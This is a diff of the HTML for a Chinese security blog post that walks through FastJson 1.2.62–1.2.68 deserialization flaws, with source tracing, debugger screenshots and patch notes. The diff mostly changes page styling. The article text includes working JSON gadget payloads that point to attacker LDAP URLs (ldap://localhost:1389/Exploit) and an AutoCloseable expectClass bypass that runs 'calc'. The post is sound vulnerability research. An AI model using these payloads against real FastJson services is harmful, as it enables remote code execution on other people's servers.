@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>FastJson 1.2.62-1.2.68反序列化漏洞 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+<link rel="canonical" href="https://curlysean.github.io/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-03-24T04:36:30.000Z">2025.03.24</time></div>
-      <div><span>更新</span><time datetime="2025-03-24T04:36:30.000Z">2025.03.24</time></div>
-      <div><span>阅读</span><strong>56 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mxJnr"><span class="toc-text">FastJson 1.2.62-1.2.68反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Otftt"><span class="toc-text">1.2.62 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#evyuq"><span class="toc-text">1.2.62 反序列化前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GJ9xD"><span class="toc-text">漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cg9NB"><span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vaUmG"><span class="toc-text">正向分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#k71ri"><span class="toc-text">EXP编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mhCJS"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vwjWL"><span class="toc-text">补丁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iFdOH"><span class="toc-text">1.2.66 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Z4itN"><span class="toc-text">1.2.66反序列化前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edTnh"><span class="toc-text">Gadget&#39;s POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LH9SG"><span class="toc-text">org.apache.shiro.realm.jndi.JndiRealmFactory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x7M85"><span class="toc-text">br.com.anteros.dbcp.AnterosDBCPConfig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SRgjI"><span class="toc-text">com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KVFVy"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yVPEG"><span class="toc-text">1.2.67反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lOtJF"><span class="toc-text">1.2.67反序列化前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gTkXQ"><span class="toc-text">Fastjson循环引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xOPlY"><span class="toc-text">Gadget&#39;s POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AzrMp"><span class="toc-text">org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#QCent"><span class="toc-text">org.apache.shiro.jndi.JndiObjectFactory</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sxkNl"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pJcT1"><span class="toc-text">1.2.68反序列化漏洞（expectClass绕过AutoType）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#adqSF"><span class="toc-text">1.2.68反序列化前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JLOJQ"><span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#b7fNW"><span class="toc-text">绕过原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sFO75"><span class="toc-text">可行性测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bmimq"><span class="toc-text">断点调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BWFH9"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R1wmY"><span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#h09Z1"><span class="toc-text">复制文件（任意文件读取）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CdujD"><span class="toc-text">写入文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZV6G8"><span class="toc-text">补丁修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paOC8"><span class="toc-text">SafeMode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#i8Gz2"><span class="toc-text">其他一些绕过黑名单的Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez1g2"><span class="toc-text">1.2.59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#g66pt"><span class="toc-text">1.2.61</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S7C1P"><span class="toc-text">1.2.62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MbKCt"><span class="toc-text">1.2.68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E7%89%88%E6%9C%AC"><span class="toc-text">未知版本</span></a></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Otftt"><span class="toc-text">1.2.62 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#evyuq"><span class="toc-text">1.2.62 反序列化前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GJ9xD"><span class="toc-text">漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cg9NB"><span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vaUmG"><span class="toc-text">正向分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#k71ri"><span class="toc-text">EXP编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mhCJS"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vwjWL"><span class="toc-text">补丁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iFdOH"><span class="toc-text">1.2.66 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Z4itN"><span class="toc-text">1.2.66反序列化前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edTnh"><span class="toc-text">Gadget&#39;s POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LH9SG"><span class="toc-text">org.apache.shiro.realm.jndi.JndiRealmFactory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x7M85"><span class="toc-text">br.com.anteros.dbcp.AnterosDBCPConfig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SRgjI"><span class="toc-text">com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KVFVy"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yVPEG"><span class="toc-text">1.2.67反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lOtJF"><span class="toc-text">1.2.67反序列化前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gTkXQ"><span class="toc-text">Fastjson循环引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xOPlY"><span class="toc-text">Gadget&#39;s POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AzrMp"><span class="toc-text">org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#QCent"><span class="toc-text">org.apache.shiro.jndi.JndiObjectFactory</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sxkNl"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pJcT1"><span class="toc-text">1.2.68反序列化漏洞（expectClass绕过AutoType）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#adqSF"><span class="toc-text">1.2.68反序列化前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JLOJQ"><span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#b7fNW"><span class="toc-text">绕过原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sFO75"><span class="toc-text">可行性测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bmimq"><span class="toc-text">断点调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BWFH9"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R1wmY"><span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#h09Z1"><span class="toc-text">复制文件（任意文件读取）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CdujD"><span class="toc-text">写入文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZV6G8"><span class="toc-text">补丁修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paOC8"><span class="toc-text">SafeMode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#i8Gz2"><span class="toc-text">其他一些绕过黑名单的Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez1g2"><span class="toc-text">1.2.59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#g66pt"><span class="toc-text">1.2.61</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S7C1P"><span class="toc-text">1.2.62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MbKCt"><span class="toc-text">1.2.68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E7%89%88%E6%9C%AC"><span class="toc-text">未知版本</span></a></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-03-24T04:36:30.000Z">2025.03.24</time></div>
+        <div><span>更新</span><time datetime="2025-03-24T04:36:30.000Z">2025.03.24</time></div>
+        <div><span>阅读</span><strong>约 21 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="mxJnr">FastJson 1.2.62-1.2.68反序列化漏洞</h1>
+        
 今天学习一下FastJson 中 1.2.62 - 1.2.68 的反序列化漏洞，思路的话和之前一样基于黑名单的绕过，但是大部分还是在 AutoType 开启的情况下，且基本都基于存在其他的依赖的条件下
 
 <h2 id="Otftt">1.2.62 反序列化漏洞</h2>
@@ -134,7 +155,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObjectImpl((trim) ? text.trim() : text);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>继续找的话，我们找到了一个getter方法和一个setter方法，但似乎这个getter方法并不是一个满足条件的getter方法（无参数），因此我们可以看<code>AbstractConverter</code>中的<code>setAsTest</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741924052265-b71c177a-68c1-4b2a-9b69-1a9b113c5024.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741924052265-b71c177a-68c1-4b2a-9b69-1a9b113c5024.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>其中<code>setAsTest</code>方法源码如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObject((trim) ? text.trim() : text);</span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
@@ -156,7 +177,7 @@ EXP如下，记得要开启AutoType哟
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;ldap://127.0.0.1:8085/JlaYFplQ\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行后</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741925535544-0ab2c0da-6f61-4042-a6a9-7fcb37bfe8b0.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741925535544-0ab2c0da-6f61-4042-a6a9-7fcb37bfe8b0.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <h3 id="mhCJS">调试分析</h3>
 
 <p>我们进入<code>CheckAutoType</code>中，对里面的一些过滤进行以下分析，有以下几个新的限制</p>
@@ -187,7 +208,7 @@ EXP如下，记得要开启AutoType哟
 <p>新版本运行后会抛出以下异常</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbe</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741927512166-70869c4f-d0f5-4e94-a590-78cd7f53d644.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741927512166-70869c4f-d0f5-4e94-a590-78cd7f53d644.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <h2 id="iFdOH">1.2.66 反序列化漏洞</h2>
 1.2.66 反序列化，有着三条Gadget，其原理都为JNDI注入，也需要服务端存在其他依赖
 
@@ -205,7 +226,7 @@ EXP如下，记得要开启AutoType哟
 <h4 id="LH9SG">org.apache.shiro.realm.jndi.JndiRealmFactory</h4>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741931232564-ad57e281-c2a1-4b89-9874-dac7904bd658.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741931232564-ad57e281-c2a1-4b89-9874-dac7904bd658.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <h4 id="x7M85">br.com.anteros.dbcp.AnterosDBCPConfig</h4>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">或</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
 
@@ -304,39 +325,39 @@ EXP如下，其实并没有什么差别，还是那句话，记得开启AutoType
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.FastjsonExcept&quot;</span>,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以看到，在无需AutoType的情况下，即可执行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742185271066-0a928ae6-94a4-4d9b-8cd0-8fa6f679cb79.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742185271066-0a928ae6-94a4-4d9b-8cd0-8fa6f679cb79.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <h4 id="bmimq">断点调试</h4>
 
 <p>我们直接在<code>checkAutoType</code>下断点调试</p>
 <p>第一次转入的类是<code>AutoCloseable</code>进行校验，这里我们可以看到expectClass为null</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742187788533-725ccc89-e381-46c4-93c3-eaa4d37db5da.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742187788533-725ccc89-e381-46c4-93c3-eaa4d37db5da.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>然后从缓存Mapping中直接获取到<code>AutoCloseable</code>，然后对获取的clazz进行了一系列的判断，判断clazz是不是null，以及internalWhite的判断，internalWhite里面的白名单一定是很安全的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742188121856-60a85355-fb41-4b2a-a9dd-b2acb0f74c0c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742188121856-60a85355-fb41-4b2a-a9dd-b2acb0f74c0c.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>后续会出现对expectClass的判断，判断expectClass是否为空，且判断它是否继承HashMap类，若满足情况，则抛出异常，反之则会返回类</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
 <p>回到<code>DefaultJSONParser</code>后，获取到clazz后再继续执行，根据<code>AutoCloseable</code>类获取到反序列化器为<code>JavaBeanDeserializer</code>使用该反序列化器进行反序列化操作</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189380971-5b3aec69-3434-4536-8ece-099e31461540.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189380971-5b3aec69-3434-4536-8ece-099e31461540.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>继续往里面走，调用<code>JavaBeanDeserializer</code>的<code>deserialze</code>方法，传入的第二个参数type即为<code>AutoCloseable</code>类</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189488179-6d26e820-57fe-455f-8145-afc1bd88003d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189488179-6d26e820-57fe-455f-8145-afc1bd88003d.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>往下面的逻辑，就是解析后面类的过程。这里看到获取不到对象反序列化器后，就会进入到if的判断中，设置 type 参数即 <code>java.lang.AutoCloseable</code> 类为 <code>checkAutoType()</code> 方法的 expectClass 参数来调用 <code>checkAutoType()</code> 函数来获取指定类型，然后在获取指定的反序列化器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189717880-48a319b9-dbec-48a0-bca6-86357b28b124.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189717880-48a319b9-dbec-48a0-bca6-86357b28b124.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>这次我们第二次进入<code>checkAutoType</code>方法，typeName是我们POC中的第二个类，exceptClass参数是POC中指定的第一个类</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190082053-e6ee6a3d-bc20-4cc9-88aa-924f6fe653d6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190082053-e6ee6a3d-bc20-4cc9-88aa-924f6fe653d6.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>因为<code>AutoCloseable</code>并不是黑名单中的类，所以expectClassFlag被设置为true</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190148229-a047bfbf-3920-467b-b43d-19e943e99910.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190148229-a047bfbf-3920-467b-b43d-19e943e99910.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>最后走到我们刚刚说的地方，当这个类不在白名单，且autoType开启或者expectClassFlag为true时，即可进入Auto开启时的检测逻辑</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190399827-5a619d91-0afc-4bac-b001-574aec65048f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190399827-5a619d91-0afc-4bac-b001-574aec65048f.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>往下，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195497771-1f71ce7a-aea2-4d6d-8648-69242285e5d4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195497771-1f71ce7a-aea2-4d6d-8648-69242285e5d4.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>跟进该函数中，这里使用<code>AppClassLoader</code>加载 <code>VulAutoCloseable</code> 类并直接返回</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195589394-78c7a9a2-a345-40d6-8753-5050d528dadc.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195589394-78c7a9a2-a345-40d6-8753-5050d528dadc.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>往下，判断其是否为jsonType，若true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常</p>
 <p>这也是过滤大多数JNDI注入Gadget的机制</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195988784-22998053-eb21-4611-9f8d-751844648336.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195988784-22998053-eb21-4611-9f8d-751844648336.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>最重点的是以下部分，这里当expectClass不为null时，就会判断我们的clazz是否为expectClass的子类，若它继承与expectClass的话，就会被添加到Mapping缓存中并返回该目标类，反之则抛出异常</p>
 <p>这里解释的我们的恶意类必须要继承自expectClass类，只有目标类是expectClass类的子类时，才能通过这里的判断，后续反序列化即可造成恶意代码的执行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742196042882-d87a0907-a4e4-45e3-8a03-ee2fb203d5f9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742196042882-d87a0907-a4e4-45e3-8a03-ee2fb203d5f9.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <h4 id="BWFH9">小结</h4>
 
 <blockquote>
@@ -361,7 +382,7 @@ EXP如下，其实并没有什么差别，还是那句话，记得开启AutoType
